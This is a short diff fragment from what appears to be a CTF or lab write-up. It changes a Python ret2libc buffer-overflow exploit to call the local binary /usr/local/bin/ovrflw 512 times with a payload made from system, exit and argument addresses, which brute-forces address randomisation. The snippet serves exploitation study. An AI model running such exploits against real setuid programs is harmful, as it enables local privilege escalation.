@@ -2359,7 +2359,11 @@ buf += system_addr
 buf += exit_addr
 buf += arg_addr
 
-print buf
+i = 0
+while (i < 512):
+	print "Try: %s" %i
+	i = i + 1
+	ret = call(["/usr/local/bin/ovrflw", buf])
 ```
 
 ```sh
